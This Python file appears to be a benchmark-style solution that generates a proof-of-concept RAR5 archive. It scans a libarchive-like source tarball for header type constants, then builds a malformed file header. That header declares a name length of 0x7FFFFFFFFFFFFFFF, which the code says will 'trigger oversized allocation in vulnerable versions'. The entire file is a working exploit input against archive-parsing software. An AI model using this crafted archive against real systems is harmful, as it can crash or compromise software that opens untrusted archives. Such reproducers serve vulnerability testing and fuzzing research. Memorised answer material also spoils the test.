import os
import re
import tarfile
import zlib
from struct import pack


def _enc_vint(n: int) -> bytes:
    if n < 0:
        raise ValueError("vint must be non-negative")
    out = bytearray()
    while True:
        b = n & 0x7F
        n >>= 7
        if n:
            out.append(b | 0x80)
        else:
            out.append(b)
            break
    return bytes(out)


def _fixedpoint_header_size(rest: bytes) -> int:
    # size == len(enc_vint(size)) + len(rest)
    size = len(rest) + 1
    for _ in range(20):
        new_size = len(_enc_vint(size)) + len(rest)
        if new_size == size:
            return size
        size = new_size
    return size


def _build_rar5_block(header_type: int, header_flags: int, extra_size: int | None, data_size: int | None, body: bytes) -> bytes:
    rest = bytearray()
    rest += _enc_vint(header_type)
    rest += _enc_vint(header_flags)
    if extra_size is not None:
        rest += _enc_vint(extra_size)
    if data_size is not None:
        rest += _enc_vint(data_size)
    rest += body

    header_size = _fixedpoint_header_size(bytes(rest))
    header = _enc_vint(header_size) + bytes(rest)

    crc = zlib.crc32(header) & 0xFFFFFFFF
    return pack("<I", crc) + header


def _find_rar5_related_text(src_path: str) -> str:
    # Best-effort; used only to detect rare changes. Safe to fail.
    try:
        with tarfile.open(src_path, "r:*") as tf:
            parts = []
            for m in tf.getmembers():
                n = m.name.lower()
                if not (n.endswith(".c") or n.endswith(".h") or n.endswith(".cc") or n.endswith(".cpp")):
                    continue
                if "rar5" not in n and "rar" not in n:
                    continue
                if m.size > 2_000_000:
                    continue
                f = tf.extractfile(m)
                if not f:
                    continue
                try:
                    b = f.read()
                finally:
                    f.close()
                if b and (b"rar5" in b.lower() or b"rar" in b.lower()):
                    try:
                        parts.append(b.decode("utf-8", "ignore"))
                    except Exception:
                        pass
            return "\n".join(parts)
    except Exception:
        return ""


def _infer_constants_from_source(text: str) -> tuple[int, int]:
    # Returns (main_type, file_type). Defaults to (1,2).
    main_type = 1
    file_type = 2

    # Try some common define names in libarchive-like codebases.
    patterns = [
        (r"(?m)^\s*#\s*define\s+RAR5_BLOCK_MAIN\s+(\d+)\s*$", "main"),
        (r"(?m)^\s*#\s*define\s+RAR5_BLOCK_FILE\s+(\d+)\s*$", "file"),
        (r"(?m)^\s*#\s*define\s+HEAD_TYPE_MAIN\s+(\d+)\s*$", "main"),
        (r"(?m)^\s*#\s*define\s+HEAD_TYPE_FILE\s+(\d+)\s*$", "file"),
        (r"(?m)^\s*#\s*define\s+BLOCK_TYPE_MAIN\s+(\d+)\s*$", "main"),
        (r"(?m)^\s*#\s*define\s+BLOCK_TYPE_FILE\s+(\d+)\s*$", "file"),
        (r"(?m)^\s*#\s*define\s+RAR5_HEADER_MAIN\s+(\d+)\s*$", "main"),
        (r"(?m)^\s*#\s*define\s+RAR5_HEADER_FILE\s+(\d+)\s*$", "file"),
    ]
    for pat, kind in patterns:
        m = re.search(pat, text)
        if not m:
            continue
        val = int(m.group(1))
        if kind == "main":
            main_type = val
        else:
            file_type = val
    return main_type, file_type


class Solution:
    def solve(self, src_path: str) -> bytes:
        # RAR5 signature
        sig = b"Rar!\x1a\x07\x01\x00"

        text = _find_rar5_related_text(src_path)
        main_type, file_type = _infer_constants_from_source(text)

        # Common header flags (RAR5 spec): 0x0001 extra area, 0x0002 data area.
        # We set data area for file header with zero data.
        HFL_DATA = 0x0002

        # Main header body: archive flags = 0
        main_body = _enc_vint(0)
        main_block = _build_rar5_block(header_type=main_type, header_flags=0, extra_size=None, data_size=None, body=main_body)

        # File header body up to (and including) name length, but omit the name bytes.
        # Use extremely large name length to trigger oversized allocation in vulnerable versions.
        name_len = 0x7FFFFFFFFFFFFFFF

        file_flags = 0
        unpacked_size = 0
        attributes = 0
        comp_info = 0
        host_os = 0

        file_body = b"".join([
            _enc_vint(file_flags),
            _enc_vint(unpacked_size),
            _enc_vint(attributes),
            _enc_vint(comp_info),
            _enc_vint(host_os),
            _enc_vint(name_len),
        ])

        file_block = _build_rar5_block(header_type=file_type, header_flags=HFL_DATA, extra_size=None, data_size=0, body=file_body)

        return sig + main_block + file_block